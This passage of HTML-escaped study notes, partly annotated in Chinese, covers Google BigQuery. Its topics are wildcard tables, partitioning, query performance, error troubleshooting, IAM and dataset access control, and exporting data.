&lt;li&gt;&lt;em&gt;No query can reference more than 1,000 tables (even via views)&lt;/em&gt;  &lt;/li&gt;
&lt;li&gt;The query planner collects table metadata which can have a performance impact for a large number of shards  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;code&gt;TABLE_DATE_RANGE(prefix, timestamp1, timestamp2)&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;Queries daily tables that overlap with the time range between &lt;code&gt;&amp;lt;timestamp1&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;timestamp2&amp;gt;&lt;/code&gt;.&lt;br /&gt;
Table names must have the following format: &lt;code&gt;&amp;lt;prefix&amp;gt;&amp;lt;day&amp;gt;&lt;/code&gt;, where &lt;code&gt;&amp;lt;day&amp;gt;&lt;/code&gt; is in the format YYYYMMDD.&lt;br /&gt;
You can use date and time functions to generate the timestamp parameters.&lt;br /&gt;
For example:&lt;br /&gt;
+ &lt;code&gt;TIMESTAMP('2012-10-01 02:03:04')&lt;/code&gt;&lt;br /&gt;
+ &lt;code&gt;DATE_ADD(CURRENT_TIMESTAMP(), -7, 'DAY')&lt;/code&gt;  &lt;/p&gt;
&lt;h4&gt;&lt;code&gt;TABLE_DATE_RANGE_STRICT(prefix, timestamp1, timestamp2)&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;This function is equivalent to &lt;code&gt;TABLE_DATE_RANGE&lt;/code&gt;.&lt;br /&gt;
The only difference is that if any daily table is missing in the sequence,&lt;br /&gt;
&lt;code&gt;TABLE_DATE_RANGE_STRICT&lt;/code&gt; fails and returns a &lt;code&gt;Not Found: Table &amp;lt;table_name&amp;gt; error&lt;/code&gt;.  &lt;/p&gt;
&lt;h4&gt;&lt;code&gt;TABLE_QUERY(dataset, expr)&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;Queries tables whose names match the supplied expr.&lt;br /&gt;
The expr parameter must be represented as a string and must contain an expression to evaluate.&lt;br /&gt;
For example, &lt;code&gt;'length(table_id) &amp;lt; 3'&lt;/code&gt;.  &lt;/p&gt;
&lt;h4&gt;Wildcard Function Examples&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT ...  
FROM  
    TABLE_DATE_RANGE(  
        dataset.log,  
        TIMESTAMP(&amp;#39;2015-01-01&amp;#39;),  
        TIMESTAMP(&amp;#39;2015-01-03&amp;#39;)  
     )  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Wildcard Tables - Standard SQL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Query multiple tables using concise SQL statements  &lt;/li&gt;
&lt;li&gt;Wildcard table represents union of all tables that match the wildcard expression (like wildcard functions)  &lt;/li&gt;
&lt;li&gt;Useful when dataset contains multiple, similarly named tables with compatible schemas  &lt;/li&gt;
&lt;li&gt;Each row in wildcard table contains special column containing value matched by wildcard character  &lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;FROM bigquery-public-data.noaa_gsod.gsod*&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Matches all tables in noaa_gsod that begin with string 'gsod'  &lt;/li&gt;
&lt;li&gt;character is required (single, double quotes are invalid)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Longer prefixes generally perform better than shorter prefixes  &lt;ul&gt;
&lt;li&gt;For example: &lt;code&gt;.gsod200*&lt;/code&gt; versus &lt;code&gt;.*&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Partitions&lt;/h2&gt;
&lt;h3&gt;Table Partitioning - Current Approach&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Time-partitioned tables are cost-effective way to manage data, write queries spanning multiple days, months, years  &lt;/li&gt;
&lt;li&gt;Create tables with time-based partitions and BigQuery automatically loads data in correct partition  &lt;ul&gt;
&lt;li&gt;Declare the table as partitioned at creation time using &lt;code&gt;--time_partitioning_type&lt;/code&gt; flag  &lt;/li&gt;
&lt;li&gt;To create partitioned table with expiration time for data, use &lt;code&gt;time_partitioning_expiration&lt;/code&gt; flag  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To query partitioned table, provide date or range of dates and query processes data for interval specified  &lt;/li&gt;
&lt;li&gt;Only data scanned is in partitions specified by interval  &lt;/li&gt;
&lt;li&gt;Queries are more performant, cheaper  &lt;/li&gt;
&lt;li&gt;Currently only supported by legacy SQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Example - Table Partitioning&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    ...  
FROM  
    sales  
WHERE  
    _PARTITIONTIME BETWEEN TIMESTAMP(&amp;quot;20160101&amp;quot;) AND TIMESTAMP(&amp;quot;20160131&amp;quot;)  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Query Performance Tips&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Denormalize tables for performance  &lt;/li&gt;
&lt;li&gt;Select only needed columns - &lt;code&gt;Do not use Select *&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Schedule batch queries at off-peak hours using jobs  &lt;/li&gt;
&lt;li&gt;Use caching when possible  &lt;ul&gt;
&lt;li&gt;Caching is best effort  &lt;/li&gt;
&lt;li&gt;If table data changes, cache is invalidated  &lt;/li&gt;
&lt;li&gt;Use jobs.getQueryResults to page through cached query results in a temporary table (no charge)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Try to use ORDER BY and LIMIT in outermost queries  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;LIMIT&lt;/code&gt; is applied to results by Master  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Build queries from the inside out by using subqueries  &lt;ul&gt;
&lt;li&gt;Filter data in subqueries  &lt;/li&gt;
&lt;li&gt;Perform arithmetic, ordering, case logic in outer query  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use queries to create materialized intermediate tables  &lt;ul&gt;
&lt;li&gt;Create subset of complex data in destination table  &lt;/li&gt;
&lt;li&gt;Partially aggregate data in destination table  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Move heavyweight filters, such as regexp, to the end  &lt;/li&gt;
&lt;li&gt;Avoid grouping on unbounded possible values  &lt;ul&gt;
&lt;li&gt;Example: Web logs with arbitrary GET parameters in the suffix  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Consider using IF/CASE instead of self-joins because IF/CASE has lower processing overhead  &lt;ul&gt;
&lt;li&gt;Self-joins require multiple disk reads  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Apply WHERE filters prior to JOINs  &lt;ul&gt;
&lt;li&gt;Predicate pushdown  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 9: Troubleshooting Errors&lt;/h1&gt;
&lt;h2&gt;Error Categories&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Request encoding errors  &lt;ul&gt;
&lt;li&gt;Associated with the query request – Invalid query syntax, and so on  &lt;/li&gt;
&lt;li&gt;Request Body 有錯誤，通常是由 Google 的 API 處理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Application errors  &lt;ul&gt;
&lt;li&gt;Errors associated in processing the request  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTTP transport layer errors  &lt;ul&gt;
&lt;li&gt;Programmatic communication errors using API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Request Encoding Errors&lt;/h2&gt;
&lt;p&gt;在 Query History 裡頭，&lt;br /&gt;
點開有錯誤的 Query 可以看到 Error code，&lt;br /&gt;
可以點選超連結去察看該 Error 詳細的錯誤原因。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Incomplete syntax  &lt;/li&gt;
&lt;li&gt;Missing or invalid objects  &lt;/li&gt;
&lt;li&gt;Missing columns in GROUP BY (for aggregations)  &lt;/li&gt;
&lt;li&gt;Incorrect or missing punctuation  &lt;/li&gt;
&lt;li&gt;Misspellings  &lt;/li&gt;
&lt;li&gt;Ambiguous field references  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Resource Errors&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Intended limitations exist in the query execution engine to protect resources  &lt;ul&gt;
&lt;li&gt;Can cause well-formed queries to fail  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Two classes of resource errors  &lt;ul&gt;
&lt;li&gt;Result too large  &lt;/li&gt;
&lt;li&gt;Resources exceeded  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Result Too Large&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery limits result sets to approximately 128MB compressed  &lt;ul&gt;
&lt;li&gt;Queries returning larger results cannot fit into response  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Result too large:  &lt;ul&gt;
&lt;li&gt;Commonly thrown on queries that use an ORDER BY with large cardinality  &lt;/li&gt;
&lt;li&gt;Can happen in multiple stages of the serving tree  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Handling Result Too Large Errors&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Use filters to limit the result set  &lt;/li&gt;
&lt;li&gt;Use LIMIT clause  &lt;/li&gt;
&lt;li&gt;Remove ORDER BY for large datasets (order by without limit is meaningless)  &lt;/li&gt;
&lt;li&gt;Specify destination table and use &lt;code&gt;allowLargeResults&lt;/code&gt; flag  &lt;ul&gt;
&lt;li&gt;Impacts query performance  &lt;/li&gt;
&lt;li&gt;可以保證資料都出得來，但效能會有影響，因為有些前置動作會比較不一樣，可以視需求決定要不要用這個 flag  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Limitations of &lt;code&gt;allowLargeResults&lt;/code&gt; flag  &lt;ul&gt;
&lt;li&gt;Cannot specify top-level ORDER BY, TOP or LIMIT clause  &lt;ul&gt;
&lt;li&gt;Negates benefit of allowLargeResults because query output is no longer computed in parallel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using allowLargeResults flag with ORDER BY can cause resources exceeded errors  &lt;ul&gt;
&lt;li&gt;Master applies final sorting  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using allowLargeResults with window functions requires PARTITION BY clause  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Resources Exceeded&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Resources exceeded error issued if a query exceeds the memory limit on a single shard  &lt;ul&gt;
&lt;li&gt;Once data is read from disk, processing is done in memory  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Most common on:  &lt;ul&gt;
&lt;li&gt;ORDER BY queries with large numbers of distinct values  &lt;/li&gt;
&lt;li&gt;JOINs with more outputs than inputs  &lt;/li&gt;
&lt;li&gt;Aggregations that require memory proportional to the number of input values  &lt;/li&gt;
&lt;li&gt;Queries where data is heavily skewed toward one key value  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Handling Resources Exceeded Errors&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;If possible, limit use of &lt;code&gt;ORDER BY&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Use aggregation functions that generate fewer output results than input rows  &lt;/li&gt;
&lt;li&gt;Avoid JOINs that generate more outputs than inputs  &lt;/li&gt;
&lt;li&gt;Avoid queries that create data skew  &lt;/li&gt;
&lt;li&gt;Queries on "guest" IDs or null values  &lt;/li&gt;
&lt;li&gt;No rule that works for every case  &lt;/li&gt;
&lt;li&gt;或者先用一個 Query 把結果存成比較小的 Table (Destination Table)，再拿這個 Table 來 Query  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;HTTP Errors and Responses&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;All BigQuery API calls are HTTP requests  &lt;/li&gt;
&lt;li&gt;All HTTP requests return status codes  &lt;/li&gt;
&lt;li&gt;Codes between 200 and 299 are success codes  &lt;/li&gt;
&lt;li&gt;HTTP error codes are between 400 and 599  &lt;/li&gt;
&lt;li&gt;BigQuery returns a standard JSON response on error  &lt;/li&gt;
&lt;li&gt;可以參考這個網頁：&lt;a href="https://cloud.google.com/bigquery/troubleshooting-errors"&gt;https://cloud.google.com/bigquery/troubleshooting-errors&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 10: Access Control&lt;/h1&gt;
&lt;h2&gt;Access Control Lists&lt;/h2&gt;
&lt;p&gt;從 Dataset 這個層面去做設定  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ACLs define permissions given to a role (or grantee) for a target (project/dataset)  &lt;/li&gt;
&lt;li&gt;ACLs consist of one or more entries that grant permission to a role (or grantee)  &lt;/li&gt;
&lt;li&gt;Permissions define the actions that can be performed against a project or dataset  &lt;ul&gt;
&lt;li&gt;Scope defines to whom the permission applies  &lt;/li&gt;
&lt;li&gt;參考 &lt;a href="https://developers.google.com/apis-explorer/#p/bigquery/v2/"&gt;https://developers.google.com/apis-explorer/#p/bigquery/v2/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Roles:  &lt;ul&gt;
&lt;li&gt;Project roles – Users can run jobs or manage the project  &lt;/li&gt;
&lt;li&gt;Dataset roles – Define user access to datasets in a project  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Project Roles&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Granted/revoked using Cloud Platform Console  &lt;/li&gt;
&lt;li&gt;Roles are assigned by email address for:  &lt;ul&gt;
&lt;li&gt;Individual users  &lt;/li&gt;
&lt;li&gt;Groups  &lt;/li&gt;
&lt;li&gt;Service accounts  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Project owners can modify project roles  &lt;ul&gt;
&lt;li&gt;Automatically granted to project creator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;要授權給一群 Google User 的話，可以考慮用 Google Groups 來做這件事，只要授權給一整個 Group 就行了，不用一個一個加。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Permissions for Project Roles&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Viewer  &lt;ul&gt;
&lt;li&gt;Can start a job - Dataset roles also required depending on job type  &lt;/li&gt;
&lt;li&gt;List and get all jobs they started  &lt;/li&gt;
&lt;li&gt;Granted READER dataset role by default for new datasets in project  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Editor  &lt;ul&gt;
&lt;li&gt;Same as Viewer, plus:  &lt;ul&gt;
&lt;li&gt;Can create new dataset in project  &lt;/li&gt;
&lt;li&gt;Is granted WRITER role by default for new datasets in project  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Owner  &lt;ul&gt;
&lt;li&gt;Same as Editor, plus:  &lt;ul&gt;
&lt;li&gt;Can list all datasets in the project  &lt;/li&gt;
&lt;li&gt;Can delete any dataset in the project  &lt;/li&gt;
&lt;li&gt;Can list and get all jobs run  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Dataset Roles&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The project ACL becomes default ACL for datasets in the project  &lt;ul&gt;
&lt;li&gt;Default access can be overridden on a per-dataset basis  &lt;/li&gt;
&lt;li&gt;Tables inherit ACLs from dataset  &lt;ul&gt;
&lt;li&gt;ACLs cannot be configured on tables  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataset ACLs allow resource separation  &lt;ul&gt;
&lt;li&gt;No need for additional clusters and data duplication  &lt;/li&gt;
&lt;li&gt;Saves money, simplifies operations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataset roles are granted or revoked using:  &lt;ul&gt;
&lt;li&gt;The BigQuery web UI  &lt;/li&gt;
&lt;li&gt;Using the 'Share dataset' option  &lt;/li&gt;
&lt;li&gt;The BigQuery API  &lt;/li&gt;
&lt;li&gt;Using Datasets:&lt;code&gt;update&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Roles are assigned by email address to:  &lt;ul&gt;
&lt;li&gt;Single user  &lt;/li&gt;
&lt;li&gt;Google Groups  &lt;/li&gt;
&lt;li&gt;Predefined group of users, such as all users, or a group of users with same project role  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Permissions for Dataset Roles&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Reader  &lt;ul&gt;
&lt;li&gt;Can read, query, copy or export tables in the dataset  &lt;ul&gt;
&lt;li&gt;Can call get on the dataset and tables in dataset  &lt;/li&gt;
&lt;li&gt;Can call list on table data for tables in the dataset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Writer  &lt;ul&gt;
&lt;li&gt;Same as READER, plus:  &lt;ul&gt;
&lt;li&gt;Can edit or append data in the dataset  &lt;ul&gt;
&lt;li&gt;Can call insert, insertAll, update or delete  &lt;/li&gt;
&lt;li&gt;Can use tables in the dataset as destinations for load, copy or query jobs  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Owner  &lt;ul&gt;
&lt;li&gt;Same as WRITER, plus:  &lt;ul&gt;
&lt;li&gt;Can call update on the dataset  &lt;/li&gt;
&lt;li&gt;Can call delete on the dataset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Note: A dataset must have at least one entity with the OWNER role.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Applying Views for Row-Level Security&lt;/h2&gt;
&lt;h3&gt;Row-Level Security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Not natively supported  &lt;ul&gt;
&lt;li&gt;Define a view to give access to a specific view of the data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;View – a BigQuery SQL query that limits the rows and columns (a virtual table) that a user can see  &lt;/li&gt;
&lt;li&gt;BigQuery views are re-executed every time the view is queried  &lt;/li&gt;
&lt;li&gt;Create view in dataset separate from underlying table’s dataset and assign ACLs to both datasets  &lt;/li&gt;
&lt;li&gt;Row-Leve Security Scenario  &lt;ul&gt;
&lt;li&gt;可以透過 View 來 select 只想被 share 出去的欄位，不需要開放整個 table 的權限。  &lt;/li&gt;
&lt;li&gt;從一個使用者 A 沒有權限的 dataset 把一個 View 存到使用者 A 有權限的 dataset，使用者 A 仍然無法使用該 View 得到他沒有權限的 dataset 的資料。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Identity and Access Management&lt;/h2&gt;
&lt;h3&gt;Benefits of IAM for BigQuery&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Admins can isolate permissions to BigQuery  &lt;ul&gt;
&lt;li&gt;For example, BigQuery roles have no authority to manage Compute Engine virtual machines  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Consistent IAM controls across all GCP products  &lt;/li&gt;
&lt;li&gt;Narrow permissions allow more fine-grained control  &lt;/li&gt;
&lt;li&gt;Backwards compatible  &lt;ul&gt;
&lt;li&gt;Legacy project permissions are preserved, and the familiar UI, API, and CLI will continue to work as before with minimal changes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Organization Node (Beta)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Organization node is root node for Google Cloud resources  &lt;/li&gt;
&lt;li&gt;2 organization roles:  &lt;ul&gt;
&lt;li&gt;Organization Admin - Control over all cloud resources  &lt;/li&gt;
&lt;li&gt;Project Creator - Controls project creation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;IAM Resource Hierarchy&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A policy is set on a resource  &lt;ul&gt;
&lt;li&gt;Each policy contains: Set of roles, role members  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Resources inherit policies from parent  &lt;ul&gt;
&lt;li&gt;Resource policies are a union of parent and resource  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If parent policy less restrictive, overrides more restrictive resource policy  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;IAM Roles - Curated Roles&lt;/h3&gt;
&lt;p&gt;The “can do what” part is defined by an IAM role.&lt;br /&gt;
An IAM role is a collection of permissions.&lt;br /&gt;
Most of the time to do any meaningful operations you need more than 1 permission.&lt;br /&gt;
For example to manage instances in a project, you need to create, delete, start, stop and change an instance.&lt;br /&gt;
So the permissions are grouped together into a role to make it easier to manage.  &lt;/p&gt;
&lt;h3&gt;BigQuery IAM Roles&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;User  &lt;ul&gt;
&lt;li&gt;Runs jobs such as queries  &lt;/li&gt;
&lt;li&gt;Can browse the project to see what data is available, but does not have access to it by default  &lt;/li&gt;
&lt;li&gt;Can be assigned at project level or higher  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Admin  &lt;ul&gt;
&lt;li&gt;All BigQuery related permissions - Access to read, write, delete all data, view jobs and/or cancel them  &lt;/li&gt;
&lt;li&gt;Can be assigned at project level or higher  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data viewer  &lt;ul&gt;
&lt;li&gt;Can view all datasets and all data within those datasets within the scope of the role  &lt;/li&gt;
&lt;li&gt;Can be assigned at dataset level or higher  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data editor  &lt;ul&gt;
&lt;li&gt;Can edit all datasets and all data within those datasets within the scope of the role  &lt;/li&gt;
&lt;li&gt;Can be assigned at dataset level or higher  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 11: Exporting Data&lt;/h1&gt;
&lt;h2&gt;Exporting Data&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Why export data?  &lt;ul&gt;
&lt;li&gt;Using data with third-party tools  &lt;/li&gt;
&lt;li&gt;Snapshots  &lt;/li&gt;
&lt;li&gt;Backups  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Export using:  &lt;ul&gt;
&lt;li&gt;Web UI  &lt;/li&gt;
&lt;li&gt;CLI  &lt;/li&gt;
&lt;li&gt;REST API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Limitations  &lt;ul&gt;
&lt;li&gt;Export up to 1 GB of data per file (multiple file export supported)  &lt;/li&gt;
&lt;li&gt;Daily limit: 1,000 exports per day, up to 10 TB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ACL requirements for exporting data:  &lt;ul&gt;
&lt;li&gt;BigQuery: Dataset-level READER access  &lt;/li&gt;
&lt;li&gt;Google Cloud Storage: WRITE access to Google Cloud Storage bucket(s)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Export Configuration Options&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Two aspects: Format and compression  &lt;ul&gt;
&lt;li&gt;destinationFormat  &lt;ul&gt;
&lt;li&gt;CSV  &lt;/li&gt;
&lt;li&gt;JSON  &lt;/li&gt;
&lt;li&gt;Avro  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;compression  &lt;ul&gt;
&lt;li&gt;GZIP  &lt;/li&gt;
&lt;li&gt;NONE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Notes:  &lt;ul&gt;
&lt;li&gt;AVRO cannot be used with GZIP compression  &lt;/li&gt;
&lt;li&gt;Nested and repeated data cannot be exported in CSV format  &lt;/li&gt;
&lt;li&gt;Defaults: CSV with no compression  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;AVRO Export Format&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Exported files are Avro container files  &lt;/li&gt;
&lt;li&gt;Each row is represented as an Avro record  &lt;ul&gt;
&lt;li&gt;Nested data is represented by nested record objects  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;em&gt;REQUIRED&lt;/em&gt; fields represented as corresponding Avro types  &lt;ul&gt;
&lt;li&gt;For example: An INTEGER type maps to an Avro LONG type  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;em&gt;NULLABLE&lt;/em&gt; fields represented as Avro Union of corresponding type and "null"  &lt;/li&gt;
&lt;li&gt;&lt;em&gt;REPEATED&lt;/em&gt; fields are represented as Avro arrays  &lt;/li&gt;
&lt;li&gt;&lt;em&gt;TIMESTAMP&lt;/em&gt; data types represented as Avro LONG types  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Running Export Jobs&lt;/h2&gt;
&lt;h3&gt;CLI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;bq extract&lt;/code&gt; - Perform an extract operation against &lt;code&gt;source_table&lt;/code&gt; into &lt;code&gt;destination_uris&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;bq extract &amp;lt;source_table&amp;gt; &amp;lt;destination_uris&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Web UI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;操作很簡單  &lt;/li&gt;
&lt;li&gt;有很大的檔案的話，儘量不要用 WebUI export，因為有可能中間被中斷就得重下載。請丟到 GCS 再去 download 下來  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Configuration Example&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;jobData&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="err"&gt;&amp;#39;projectId&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;projectId,&lt;/span&gt;  
    &lt;span class="err"&gt;&amp;#39;configuration&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;  
        &lt;span class="err"&gt;&amp;#39;extract&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;  
            &lt;span class="err"&gt;&amp;#39;sourceTable&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;  
                &lt;span class="err"&gt;&amp;#39;projectId&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;projectId,&lt;/span&gt;  
                &lt;span class="err"&gt;&amp;#39;datasetId&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;datasetId,&lt;/span&gt;  
                &lt;span class="err"&gt;&amp;#39;tableId&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;tableId&lt;/span&gt;  
            &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;  
            &lt;span class="err"&gt;&amp;#39;destinationUris&amp;#39;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;gs://&amp;lt;bucket&amp;gt;/&amp;lt;file&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;  
            &lt;span class="err"&gt;&amp;#39;destinationFormat&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;NEWLINE_DELIMITED_JSON&amp;#39;&lt;/span&gt;  
        &lt;span class="err"&gt;}&lt;/span&gt; &lt;span class="err"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Wildcard Exports&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;If export is larger than 1GB, use a wildcard to partition the output into multiple files  &lt;/li&gt;
&lt;li&gt;Include a glob character (&lt;code&gt;*&lt;/code&gt;) in export file name  &lt;ul&gt;
